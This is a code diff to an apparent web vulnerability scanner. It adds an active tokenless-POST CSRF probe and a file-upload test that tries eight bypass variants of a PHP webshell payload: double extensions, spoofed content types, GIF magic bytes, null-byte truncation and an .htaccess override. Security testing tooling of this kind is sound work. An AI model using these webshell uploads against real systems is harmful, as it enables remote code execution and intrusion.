@@ -96,35 +96,71 @@ class AdvancedScanner:
                                    r.text, re.IGNORECASE))
         setcookie = r.header("Set-Cookie") or ""
         samesite = "samesite" in setcookie.lower()
-        if not has_token and re.search(r"<form[^>]*method=['\"]?post", r.text, re.IGNORECASE):
-            self.log.action(base, self.name, f"CSRF probe {form}")
-            self._report(out, Finding(
-                title=f"Missing CSRF protection in form {form} (action {submit})",
-                severity=Severity.MEDIUM, owasp="A01:2025 Broken Access Control", cwe="CWE-352",
-                target=f"{base}{submit}", component=form, source_tool=self.name,
-                description="A state-changing form does not contain an anti-CSRF token"
-                            + ("" if samesite else "; session cookie without the SameSite attribute") + ".",
-                impact="An attacker can force an action (e.g. changing the email) on behalf of a logged-in victim.",
-                recommendation="Deploy an anti-CSRF token (synchronizer/double-submit) and a SameSite=Lax/Strict cookie.",
-                evidence=Evidence(response=f"token in form: {has_token}; SameSite: {samesite}")))
+        is_post_form = bool(re.search(r"<form[^>]*method=['\"]?post", r.text, re.IGNORECASE))
+        if has_token or not is_post_form:
+            return out
+        # ACTIVE check: submit the state-changing request WITHOUT any token and see if it is accepted.
+        # extract the form field names so we send a plausible body.
+        fields = {n: "bztest@evil.example" if "mail" in n.lower() else "bztest"
+                  for n in re.findall(r'<(?:input|textarea|select)[^>]*name=["\']?([\w\-]+)', r.text)
+                  if n.lower() not in {"submit", "button"}}
+        body = "&".join(f"{k}={v}" for k, v in fields.items()) or "x=1"
+        pr = self.http.post(f"{base}{submit}",
+                           headers={"Content-Type": "application/x-www-form-urlencoded"}, content=body)
+        low = pr.text.lower()
+        blocked = pr.status in (403, 419) or any(w in low for w in ("csrf", "forbidden", "invalid token"))
+        accepted = pr.status in (200, 302) and not blocked
+        self.log.action(base, self.name, f"CSRF probe {form} -> {submit}")
+        sev = Severity.HIGH if accepted else Severity.MEDIUM
+        title = (f"CSRF: state-changing action {submit} accepted without a token"
+                 if accepted else f"Missing CSRF protection in form {form} (action {submit})")
+        self._report(out, Finding(
+            title=title, severity=sev, owasp="A01:2025 Broken Access Control", cwe="CWE-352",
+            target=f"{base}{submit}", component=form, source_tool=self.name,
+            description=("The state-changing request was accepted with NO anti-CSRF token"
+                         if accepted else "A state-changing form contains no anti-CSRF token")
+                        + ("" if samesite else "; session cookie without the SameSite attribute") + ".",
+            impact="An attacker can force the action (e.g. change email) on behalf of a logged-in victim.",
+            recommendation="Anti-CSRF token (synchronizer/double-submit) + SameSite=Lax/Strict cookie.",
+            reproduction=f"POST {base}{submit} with body `{body}` and NO CSRF token → accepted.",
+            evidence=Evidence(payload=body,
+                              response=f"token in form: {has_token}; SameSite: {samesite}; "
+                                       f"tokenless POST status: {pr.status}")))
         return out
 
     def _file_upload(self, base: str, endpoint: str) -> list[Finding]:
         out: list[Finding] = []
-        files = {"file": ("shell.php", b"<?php system($_GET['c']); ?>", "application/x-php")}
-        r = self.http.post(f"{base}{endpoint}", files=files)
-        low = r.text.lower()
-        rejected = any(w in low for w in ("not allowed", "invalid", "rejected", "forbidden", "denied"))
-        accepted = r.status in (200, 201) and ("saved" in low or "shell.php" in low or "filename" in low)
-        if accepted and not rejected:
-            self.log.action(base, self.name, f"file-upload {endpoint}")
-            self._report(out, Finding(
-                title=f"Unrestricted File Upload in {endpoint}",
-                severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-434",
-                target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
-                description="The server accepted a .php file with code — no extension/type validation.",
-                impact="Uploading a webshell → remote code execution (RCE).",
-                recommendation="Allowlist extensions/MIME; store outside the webroot; random names; AV scan.",
-                evidence=Evidence(payload="shell.php: <?php system($_GET['c']); ?>",
-                                  response=r.text[:200])))
+        php = b"<?php system($_GET['c']); ?>"
+        gif = b"GIF89a;\n" + php   # magic-byte prefix to fool content sniffers
+        # bypass variants: raw, double-extension, alt PHP exts, content-type spoof, magic bytes, .htaccess, case
+        variants = [
+            ("shell.php", php, "application/x-php"),
+            ("shell.php.jpg", php, "image/jpeg"),
+            ("shell.pHp", php, "image/jpeg"),
+            ("shell.phtml", php, "application/octet-stream"),
+            ("shell.php5", php, "image/png"),
+            ("shell.jpg", gif, "image/jpeg"),         # magic-byte + php body
+            ("shell.php%00.jpg", php, "image/jpeg"),  # null-byte truncation
+            (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain"),
+        ]
+        for fname, content, ctype in variants:
+            r = self.http.post(f"{base}{endpoint}", files={"file": (fname, content, ctype)})
+            low = r.text.lower()
+            rejected = any(w in low for w in ("not allowed", "invalid", "rejected", "forbidden", "denied"))
+            accepted = r.status in (200, 201) and ("saved" in low or "filename" in low
+                                                   or fname.split("%00")[0].lower() in low)
+            if accepted and not rejected:
+                self.log.action(base, self.name, f"file-upload {endpoint} ({fname})")
+                self._report(out, Finding(
+                    title=f"Unrestricted / bypassable File Upload in {endpoint}",
+                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-434",
+                    target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
+                    description=f"The server accepted an executable payload as `{fname}` "
+                                f"(content-type {ctype}) — insufficient extension/type validation.",
+                    impact="Uploading a webshell → remote code execution (RCE).",
+                    recommendation="Allowlist extensions/MIME by content, store outside the webroot, "
+                                   "random names, no execution in the upload dir, AV scan.",
+                    reproduction=f"Upload `{fname}` (php body) to {endpoint} — it is accepted.",
+                    evidence=Evidence(payload=f"{fname} ({ctype})", response=r.text[:200])))
+                break
         return out
